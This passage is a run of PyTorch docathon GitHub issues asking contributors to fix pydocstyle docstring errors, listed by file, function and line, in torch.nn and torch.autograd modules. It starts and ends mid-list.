- **File**: `torch/nn/functional.py`, **Entity**: `softmax`, **Line**: 1832, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `gumbel_softmax`, **Line**: 1868, **Description**: First line should be in imperative mood (perhaps 'Sample', not 'Samples')
- **File**: `torch/nn/functional.py`, **Entity**: `log_softmax`, **Line**: 1930, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `tanh`, **Line**: 1969, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `tanh`, **Line**: 1969, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `sigmoid`, **Line**: 1980, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `sigmoid`, **Line**: 1980, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `hardsigmoid`, **Line**: 1990, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/functional.py`, **Entity**: `hardsigmoid`, **Line**: 1990, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `silu`, **Line**: 2057, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `silu`, **Line**: 2057, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `mish`, **Line**: 2081, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `mish`, **Line**: 2081, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `hardswish`, **Line**: 2100, **Description**: First line should end with a period (not '
- **File**: `torch/nn/functional.py`, **Entity**: `hardswish`, **Line**: 2100, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `embedding`, **Line**: 2136, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/functional.py`, **Entity**: `embedding`, **Line**: 2136, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/nn/functional.py`, **Entity**: `embedding_bag`, **Line**: 2254, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `embedding_bag`, **Line**: 2254, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/functional.py`, **Entity**: `embedding_bag`, **Line**: 2254, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/functional.py`, **Entity**: `batch_norm`, **Line**: 2462, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `instance_norm`, **Line**: 2507, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `instance_norm`, **Line**: 2507, **Description**: First line should end with a period (not 'a')
- **File**: `torch/nn/functional.py`, **Entity**: `instance_norm`, **Line**: 2507, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `layer_norm`, **Line**: 2540, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `group_norm`, **Line**: 2554, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `local_response_norm`, **Line**: 2567, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `local_response_norm`, **Line**: 2567, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/functional.py`, **Entity**: `local_response_norm`, **Line**: 2567, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/nn/functional.py`, **Entity**: `ctc_loss`, **Line**: 2614, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **File**: `torch/nn/functional.py`, **Entity**: `nll_loss`, **Line**: 2682, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **File**: `torch/nn/functional.py`, **Entity**: `kl_div`, **Line**: 2898, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `kl_div`, **Line**: 2898, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/functional.py`, **Entity**: `kl_div`, **Line**: 2898, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **File**: `torch/nn/functional.py`, **Entity**: `cross_entropy`, **Line**: 2981, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/nn/functional.py`, **Entity**: `binary_cross_entropy`, **Line**: 3072, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `binary_cross_entropy`, **Line**: 3072, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/functional.py`, **Entity**: `binary_cross_entropy`, **Line**: 3072, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/nn/functional.py`, **Entity**: `binary_cross_entropy_with_logits`, **Line**: 3142, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `binary_cross_entropy_with_logits`, **Line**: 3142, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/functional.py`, **Entity**: `binary_cross_entropy_with_logits`, **Line**: 3142, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/nn/functional.py`, **Entity**: `smooth_l1_loss`, **Line**: 3214, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `smooth_l1_loss`, **Line**: 3214, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/functional.py`, **Entity**: `smooth_l1_loss`, **Line**: 3214, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/nn/functional.py`, **Entity**: `huber_loss`, **Line**: 3254, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `huber_loss`, **Line**: 3254, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/functional.py`, **Entity**: `huber_loss`, **Line**: 3254, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/nn/functional.py`, **Entity**: `l1_loss`, **Line**: 3285, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `l1_loss`, **Line**: 3285, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `mse_loss`, **Line**: 3316, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `mse_loss`, **Line**: 3316, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `margin_ranking_loss`, **Line**: 3349, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `margin_ranking_loss`, **Line**: 3349, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `hinge_embedding_loss`, **Line**: 3387, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `hinge_embedding_loss`, **Line**: 3387, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `multilabel_margin_loss`, **Line**: 3416, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `multilabel_margin_loss`, **Line**: 3416, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `soft_margin_loss`, **Line**: 3444, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `soft_margin_loss`, **Line**: 3444, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `multilabel_soft_margin_loss`, **Line**: 3467, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `multilabel_soft_margin_loss`, **Line**: 3467, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `cosine_embedding_loss`, **Line**: 3515, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `cosine_embedding_loss`, **Line**: 3515, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `multi_margin_loss`, **Line**: 3548, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/functional.py`, **Entity**: `multi_margin_loss`, **Line**: 3548, **Description**: First line should not be the function's ""signature""
- **File**: `torch/nn/functional.py`, **Entity**: `upsample`, **Line**: 3723, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `upsample`, **Line**: 3723, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/functional.py`, **Entity**: `_is_integer`, **Line**: 3788, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `interpolate`, **Line**: 3824, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `interpolate`, **Line**: 3824, **Description**: First line should end with a period (not 'n')
- **File**: `torch/nn/functional.py`, **Entity**: `grid_sample`, **Line**: 4171, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `grid_sample`, **Line**: 4171, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/functional.py`, **Entity**: `affine_grid`, **Line**: 4313, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `affine_grid`, **Line**: 4313, **Description**: First line should end with a period (not 'f')
- **File**: `torch/nn/functional.py`, **Entity**: `affine_grid`, **Line**: 4313, **Description**: First line should be in imperative mood (perhaps 'Generate', not 'Generates')
- **File**: `torch/nn/functional.py`, **Entity**: `triplet_margin_loss`, **Line**: 4607, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/functional.py`, **Entity**: `triplet_margin_loss`, **Line**: 4607, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/functional.py`, **Entity**: `triplet_margin_with_distance_loss`, **Line**: 4642, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/nn/functional.py`, **Entity**: `normalize`, **Line**: 4704, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/nn/functional.py`, **Entity**: `unfold`, **Line**: 4742, **Description**: First line should be in imperative mood (perhaps 'Extract', not 'Extracts')
- **File**: `torch/nn/functional.py`, **Entity**: `fold`, **Line**: 4772, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `fold`, **Line**: 4772, **Description**: First line should end with a period (not 'g')
- **File**: `torch/nn/functional.py`, **Entity**: `fold`, **Line**: 4772, **Description**: First line should be in imperative mood (perhaps 'Combine', not 'Combines')
- **File**: `torch/nn/functional.py`, **Entity**: `_in_projection_packed`, **Line**: 4799, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `_in_projection_packed`, **Line**: 4799, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/nn/functional.py`, **Entity**: `_in_projection`, **Line**: 4866, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `_in_projection`, **Line**: 4866, **Description**: First line should end with a period (not 'y')
- **File**: `torch/nn/functional.py`, **Entity**: `_in_projection`, **Line**: 4866, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/nn/functional.py`, **Entity**: `multi_head_attention_forward`, **Line**: 5112, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/functional.py`, **Entity**: `multi_head_attention_forward`, **Line**: 5112, **Description**: First line should end with a period (not '

cc @carljparker",False
Fix docstring errors in init.py module: docs triaged medium docathon-h2-2023,"Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/init.py`, **Entity**: `calculate_gain`, **Line**: 68, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `uniform_`, **Line**: 123, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `uniform_`, **Line**: 123, **Description**: First line should end with a period (not 'm')
- **File**: `torch/nn/init.py`, **Entity**: `uniform_`, **Line**: 123, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `normal_`, **Line**: 141, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `normal_`, **Line**: 141, **Description**: First line should end with a period (not 'l')
- **File**: `torch/nn/init.py`, **Entity**: `normal_`, **Line**: 141, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `trunc_normal_`, **Line**: 165, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `trunc_normal_`, **Line**: 165, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/init.py`, **Entity**: `trunc_normal_`, **Line**: 165, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `constant_`, **Line**: 187, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `ones_`, **Line**: 203, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `zeros_`, **Line**: 216, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `eye_`, **Line**: 229, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `eye_`, **Line**: 229, **Description**: First line should end with a period (not 'y')
- **File**: `torch/nn/init.py`, **Entity**: `eye_`, **Line**: 229, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `dirac_`, **Line**: 249, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `dirac_`, **Line**: 249, **Description**: First line should end with a period (not 'c')
- **File**: `torch/nn/init.py`, **Entity**: `dirac_`, **Line**: 249, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `xavier_uniform_`, **Line**: 311, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `xavier_uniform_`, **Line**: 311, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/init.py`, **Entity**: `xavier_uniform_`, **Line**: 311, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `xavier_normal_`, **Line**: 338, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `xavier_normal_`, **Line**: 338, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/init.py`, **Entity**: `xavier_normal_`, **Line**: 338, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `kaiming_uniform_`, **Line**: 376, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `kaiming_uniform_`, **Line**: 376, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/init.py`, **Entity**: `kaiming_uniform_`, **Line**: 376, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `kaiming_normal_`, **Line**: 425, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `kaiming_normal_`, **Line**: 425, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/init.py`, **Entity**: `kaiming_normal_`, **Line**: 425, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `orthogonal_`, **Line**: 462, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `orthogonal_`, **Line**: 462, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/init.py`, **Entity**: `orthogonal_`, **Line**: 462, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')
- **File**: `torch/nn/init.py`, **Entity**: `sparse_`, **Line**: 507, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/init.py`, **Entity**: `sparse_`, **Line**: 507, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/init.py`, **Entity**: `sparse_`, **Line**: 507, **Description**: First line should be in imperative mood (perhaps 'Fill', not 'Fills')

cc @carljparker",False
"Fix docstring errors in reductions.py, spawn.py, pool.py, parameter.py, cpp.py, grad.py, __init__.py, profiler.py, queue.py, graph.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/autograd/profiler.py`, **Entity**: `profile`, **Line**: 86, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `profile`, **Line**: 86, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `self_cpu_time_total`, **Line**: 356, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `self_cpu_time_total`, **Line**: 356, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/autograd/profiler.py`, **Entity**: `self_cpu_time_total`, **Line**: 356, **Description**: First line should end with a period (not 'f')
- **File**: `torch/autograd/profiler.py`, **Entity**: `record_function`, **Line**: 498, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `record_function`, **Line**: 498, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `record_function`, **Line**: 498, **Description**: First line should end with a period (not 'f')
- **File**: `torch/autograd/profiler.py`, **Entity**: `_call_end_callbacks_on_future`, **Line**: 563, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `_call_end_callbacks_on_future`, **Line**: 563, **Description**: First line should end with a period (not 'c')
- **File**: `torch/autograd/profiler.py`, **Entity**: `emit_itt`, **Line**: 604, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `emit_nvtx`, **Line**: 671, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `load_nvprof`, **Line**: 788, **Description**: First line should be in imperative mood (perhaps 'Open', not 'Opens')
- **File**: `torch/autograd/profiler.py`, **Entity**: `EnforceUnique`, **Line**: 797, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `KinetoStepTracker`, **Line**: 872, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `KinetoStepTracker`, **Line**: 872, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/profiler.py`, **Entity**: `increment_step`, **Line**: 920, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/graph.py`, **Entity**: `name`, **Line**: 23, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/autograd/graph.py`, **Entity**: `metadata`, **Line**: 43, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/autograd/graph.py`, **Entity**: `register_hook`, **Line**: 52, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/autograd/graph.py`, **Entity**: `register_prehook`, **Line**: 90, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/autograd/graph.py`, **Entity**: `increment_version`, **Line**: 133, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/graph.py`, **Entity**: `increment_version`, **Line**: 133, **Description**: First line should end with a period (not 'd')
- **File**: `torch/autograd/graph.py`, **Entity**: `increment_version`, **Line**: 133, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/autograd/graph.py`, **Entity**: `saved_tensors_hooks`, **Line**: 148, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/graph.py`, **Entity**: `save_on_cpu`, **Line**: 220, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/graph.py`, **Entity**: `save_on_cpu`, **Line**: 220, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/graph.py`, **Entity**: `save_on_cpu`, **Line**: 220, **Description**: First line should end with a period (not 'e')
- **File**: `torch/autograd/graph.py`, **Entity**: `register_multi_grad_hook`, **Line**: 317, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/autograd/graph.py`, **Entity**: `allow_mutation_on_saved_tensors`, **Line**: 527, **Description**: First line should end with a period (not 'd')
- **File**: `torch/multiprocessing/pool.py`, **Entity**: `Pool`, **Line**: 17, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/multiprocessing/pool.py`, **Entity**: `Pool`, **Line**: 17, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/multiprocessing/pool.py`, **Entity**: `_repopulate_pool`, **Line**: 28, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/multiprocessing/pool.py`, **Entity**: `_repopulate_pool`, **Line**: 28, **Description**: First line should end with a period (not ',')
- **File**: `torch/multiprocessing/queue.py`, **Entity**: `ConnectionWrapper`, **Line**: 8, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/multiprocessing/queue.py`, **Entity**: `ConnectionWrapper`, **Line**: 8, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/multiprocessing/queue.py`, **Entity**: `ConnectionWrapper`, **Line**: 8, **Description**: First line should end with a period (not 'o')
- **File**: `torch/multiprocessing/reductions.py`, **Entity**: `StorageWeakRef`, **Line**: 23, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/multiprocessing/reductions.py`, **Entity**: `SharedCache`, **Line**: 59, **Description**: First line should end with a period (not 'f')
- **File**: `torch/multiprocessing/spawn.py`, **Entity**: `ProcessRaisedException`, **Line**: 26, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/multiprocessing/spawn.py`, **Entity**: `ProcessRaisedException`, **Line**: 26, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/multiprocessing/spawn.py`, **Entity**: `ProcessRaisedException`, **Line**: 26, **Description**: First line should end with a period (not 'n')
- **File**: `torch/multiprocessing/spawn.py`, **Entity**: `ProcessExitedException`, **Line**: 40, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/multiprocessing/spawn.py`, **Entity**: `ProcessExitedException`, **Line**: 40, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/multiprocessing/spawn.py`, **Entity**: `ProcessExitedException`, **Line**: 40, **Description**: First line should end with a period (not 'l')
- **File**: `torch/multiprocessing/spawn.py`, **Entity**: `join`, **Line**: 92, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/multiprocessing/spawn.py`, **Entity**: `join`, **Line**: 92, **Description**: First line should be in imperative mood (perhaps 'Try', not 'Tries')
- **File**: `torch/multiprocessing/__init__.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/multiprocessing/__init__.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not '`')
- **File**: `torch/multiprocessing/__init__.py`, **Entity**: `set_sharing_strategy`, **Line**: 51, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/multiprocessing/__init__.py`, **Entity**: `get_sharing_strategy`, **Line**: 63, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/multiprocessing/__init__.py`, **Entity**: `get_all_sharing_strategies`, **Line**: 68, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/__init__.py`, **Entity**: `factory_kwargs`, **Line**: 14, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/__init__.py`, **Entity**: `factory_kwargs`, **Line**: 14, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/cpp.py`, **Entity**: `OrderedDictWrapper`, **Line**: 7, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/cpp.py`, **Entity**: `OrderedDictWrapper`, **Line**: 7, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/cpp.py`, **Entity**: `ModuleWrapper`, **Line**: 50, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/cpp.py`, **Entity**: `ModuleWrapper`, **Line**: 50, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/grad.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/grad.py`, **Entity**: `conv1d_input`, **Line**: 8, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/grad.py`, **Entity**: `conv1d_input`, **Line**: 8, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/grad.py`, **Entity**: `conv1d_weight`, **Line**: 40, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/grad.py`, **Entity**: `conv2d_input`, **Line**: 71, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/grad.py`, **Entity**: `conv2d_input`, **Line**: 71, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/grad.py`, **Entity**: `conv2d_weight`, **Line**: 103, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/grad.py`, **Entity**: `conv3d_input`, **Line**: 134, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/grad.py`, **Entity**: `conv3d_input`, **Line**: 134, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/grad.py`, **Entity**: `conv3d_weight`, **Line**: 166, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **File**: `torch/nn/parameter.py`, **Entity**: `Parameter`, **Line**: 14, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/parameter.py`, **Entity**: `materialize`, **Line**: 105, **Description**: 1 blank line required between summary line and description (found 0)

cc @carljparker",False
"Fix docstring errors in gradcheck.py, forward_ad.py, profiler_util.py, profiler_legacy.py, functional.py, grad_mode.py, function.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `enter_dual_level`, **Line**: 15, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `enter_dual_level`, **Line**: 15, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `exit_dual_level`, **Line**: 32, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `exit_dual_level`, **Line**: 32, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `make_dual`, **Line**: 50, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `make_dual`, **Line**: 50, **Description**: First line should end with a period (not 'a')
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `UnpackedDualTensor`, **Line**: 109, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `UnpackedDualTensor`, **Line**: 109, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `UnpackedDualTensor`, **Line**: 109, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `unpack_dual`, **Line**: 115, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `dual_level`, **Line**: 146, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `dual_level`, **Line**: 146, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/forward_ad.py`, **Entity**: `dual_level`, **Line**: 146, **Description**: First line should end with a period (not 't')
- **File**: `torch/autograd/functional.py`, **Entity**: `vjp`, **Line**: 218, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/autograd/functional.py`, **Entity**: `vjp`, **Line**: 218, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/autograd/functional.py`, **Entity**: `vjp`, **Line**: 218, **Description**: First line should end with a period (not 'e')
- **File**: `torch/autograd/functional.py`, **Entity**: `vjp`, **Line**: 218, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/autograd/functional.py`, **Entity**: `jvp`, **Line**: 309, **Description**: No blank lines allowed after function docstring (found 1)
